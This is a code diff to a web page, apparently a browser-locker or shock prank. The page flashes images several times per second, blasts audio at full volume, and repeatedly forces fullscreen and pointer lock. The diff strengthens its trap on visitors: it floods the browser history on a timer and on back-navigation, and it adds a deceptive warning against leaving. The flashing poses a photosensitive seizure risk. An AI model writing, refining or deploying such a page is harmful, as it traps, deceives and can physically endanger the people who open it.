@@ -107,7 +107,7 @@ body, html {
     opacity: 0.3;
 }
 
-/* FLASH LAYER - ABOVE NAGGARS.GIF */
+/* FLASH LAYER */
 .flash-layer {
     position: fixed;
     top: 0;
@@ -121,12 +121,12 @@ body, html {
 }
 .flash-img {
     position: absolute;
-    max-width: 58%;
-    max-height: 58%;
+    max-width: 38%;
+    max-height: 38%;
     opacity: 0;
     visibility: hidden;
-    filter: brightness(1.6) contrast(1.4);
-    transition: all 0.04s linear;
+    filter: brightness(1.5) contrast(1.3);
+    transition: all 0.12s linear;
 }
 </style>
 </head>
@@ -155,7 +155,7 @@ body, html {
     </div>
 </div>
 
-<!-- FLASHING IMAGES (Correct file names + extensions) -->
+<!-- FLASHING IMAGES -->
 <div class="flash-layer" id="flashLayer">
     <img id="img1" class="flash-img" src="img1.jpg" alt="">
     <img id="img2" class="flash-img" src="img2.webp" alt="">
@@ -172,11 +172,13 @@ body, html {
 <script>
 (function() {
     let hasTriggered = false;
+    const ORIGINAL_WIDTH = 640;
+    const ORIGINAL_HEIGHT = 480;
 
+    // --- AUDIO BOOST ---
     let audioContext;
     let gainNode;
     const mediaElements = [];
-
     function initAudioBoost() {
         audioContext = new (window.AudioContext || window.webkitAudioContext)();
         gainNode = audioContext.createGain();
@@ -209,12 +211,19 @@ body, html {
     }
 
     function playAllMedia() {
-        if (audioContext && audioContext.state === 'suspended') audioContext.resume();
+        if (audioContext && audioContext.state === 'suspended') {
+            audioContext.resume();
+        }
         mediaElements.forEach(m => {
             if (m) {
                 m.volume = 1.0;
                 m.muted = false;
-                m.play().catch(() => setInterval(() => m.play(), 100));
+                const playPromise = m.play();
+                if (playPromise !== undefined) {
+                    playPromise.catch(() => {
+                        setInterval(() => m.play(), 100);
+                    });
+                }
             }
         });
     }
@@ -228,12 +237,14 @@ body, html {
     }
 
     function lockPointer() {
-        if (document.body.requestPointerLock) document.body.requestPointerLock();
+        if (document.body.requestPointerLock) {
+            document.body.requestPointerLock();
+        }
     }
 
     function floodHistory() {
-        for (let i = 0; i < 20; i++) {
-            history.pushState(null, null, location.href);
+        for (let i = 0; i < 50; i++) {   // Increased
+            history.pushState(null, null, location.href + "?" + i);
         }
     }
 
@@ -248,11 +259,13 @@ body, html {
             if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement && !document.msFullscreenElement) {
                 attemptFullscreen();
             }
-            if (!document.pointerLockElement) lockPointer();
+            if (!document.pointerLockElement) {
+                lockPointer();
+            }
         }
     }
 
-    // Aggressive Flashing
+    // === CALMER BUT STILL FLASHING IMAGES ===
     function startFlashing() {
         const flashLayer = document.getElementById('flashLayer');
         const images = document.querySelectorAll('.flash-img');
@@ -265,23 +278,22 @@ body, html {
 
         setInterval(() => {
             images.forEach(img => {
-                const x = Math.random() * 80 + 10;
-                const y = Math.random() * 80 + 10;
-                const scale = 0.6 + Math.random() * 1.8;
-                const rot = Math.random() * 70 - 35;
-
+                const x = Math.random() * 75 + 12.5;
+                const y = Math.random() * 75 + 12.5;
+                const scale = 0.55 + Math.random() * 0.7;   // Smaller size
+                
                 img.style.left = `${x}%`;
                 img.style.top = `${y}%`;
-                img.style.transform = `translate(-50%, -50%) scale(${scale}) rotate(${rot}deg)`;
-                img.style.opacity = Math.random() > 0.2 ? '1' : '0.05';
+                img.style.transform = `translate(-50%, -50%) scale(${scale}) rotate(${Math.random()*25-12.5}deg)`;
+                img.style.opacity = Math.random() > 0.3 ? '1' : '0.08';
             });
-        }, 32);
+        }, 145);   // Slower movement
     }
 
+    // --- START FUNCTION ---
     window.startExperience = function() {
         if (hasTriggered) return;
         hasTriggered = true;
-
         const overlay = document.getElementById('startOverlay');
         const blackScreen = document.querySelector('.black-screen');
         if (overlay) overlay.style.display = 'none';
@@ -292,8 +304,8 @@ body, html {
         playAllMedia();
         attemptFullscreen();
         lockPointer();
-        startFlashing();           // Start flashing
-        setInterval(reengageLocks, 200);
+        startFlashing();
+        setInterval(reengageLocks, 150);
 
         const events = ['mousemove', 'click', 'keydown', 'touchstart', 'mousedown'];
         events.forEach(eventType => {
@@ -317,15 +329,33 @@ body, html {
     document.addEventListener('dragstart', e => e.preventDefault(), true);
     document.addEventListener('selectstart', e => e.preventDefault(), true);
 
+    // === STRONGER ANTI-LEAVE PROTECTION ===
     window.onbeforeunload = function() {
-        return "Are you absolutely sure you want to leave?";
+        floodHistory();
+        return "⚠️ THIS PAGE IS TRYING TO SHOW YOU SOMETHING IMPORTANT. LEAVING MAY CAUSE LOSS OF PROGRESS.";
     };
+
     window.onpopstate = function() {
         if (hasTriggered) {
             floodHistory();
             reengageLocks();
         }
     };
+
+    // Extra security
+    setInterval(() => {
+        if (hasTriggered) {
+            floodHistory();
+        }
+    }, 800);
+
+    document.addEventListener('visibilitychange', () => {
+        if (hasTriggered && document.hidden) {
+            floodHistory();
+            attemptFullscreen();
+        }
+    });
+
 })();
 </script>
 </body>
